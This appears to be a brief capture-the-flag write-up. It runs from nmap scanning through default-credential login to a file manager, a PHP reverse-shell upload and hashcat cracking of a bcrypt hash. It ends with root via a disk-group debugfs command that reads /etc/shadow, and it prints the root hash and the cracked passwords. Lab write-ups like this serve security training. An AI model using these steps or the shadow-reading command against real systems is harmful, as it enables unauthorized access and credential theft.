PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-phpself-xss: ERROR: Script execution failed (use -d to debug)
| http-enum: 
|   /wordpress/: Blog
|   /readme.html: Wordpress version: 2 
|   /wp-includes/images/rss.png: Wordpress version 2.2 found.
|   /wp-includes/js/jquery/suggest.js: Wordpress version 2.5 found.
|   /wp-includes/images/blank.gif: Wordpress version 2.6 found.
|   /wp-includes/js/comment-reply.js: Wordpress version 2.7 found.
|   /readme.html: Interesting, a readme.
|_  /filemanager/: Potentially interesting folder

<img width="1035" height="468" alt="image" src="https://github.com/user-attachments/assets/075ad07b-6746-4367-983b-786e0e447863" />

logged in with admin admin
<img width="1313" height="718" alt="image" src="https://github.com/user-attachments/assets/6a008cc5-4294-4ac2-b273-96b7c2de8a4c" />

upload shell.php for rev shell
<img width="153" height="47" alt="image" src="https://github.com/user-attachments/assets/8d01b3b6-6696-40e3-b61b-f75a693b79a5" />

in filemanager/config/htusers.php
<img width="1307" height="207" alt="image" src="https://github.com/user-attachments/assets/411bd7d1-ab73-4cbe-a71e-8daa681b3ac4" />

using hashcat 3200 bcrypt dora:doraemon
<img width="624" height="203" alt="image" src="https://github.com/user-attachments/assets/8884e0b6-9adb-42bd-89ce-b962c9f3b80f" />

dora is in disk group
uid=1000(dora) gid=1000(dora) groups=1000(dora),6(disk)

RUN debugfs -R "cat /etc/shadow" /dev/mapper/ubuntu--vg-ubuntu--lv
reveals shadow file
root:$6$AIWcIr8PEVxEWgv1$3mFpTQAc9Kzp4BGUQ2sPYYFE/dygqhDiv2Yw.XcU.Q8n1YO05.a/4.D/x4ojQAkPnv/v7Qrw7Ici7.hs0sZiC.:19453:0:99999:7:::

run hashcat. root:explorer
<img width="1156" height="171" alt="image" src="https://github.com/user-attachments/assets/7a589f66-fb0b-45dc-a7d0-7750606b7376" />
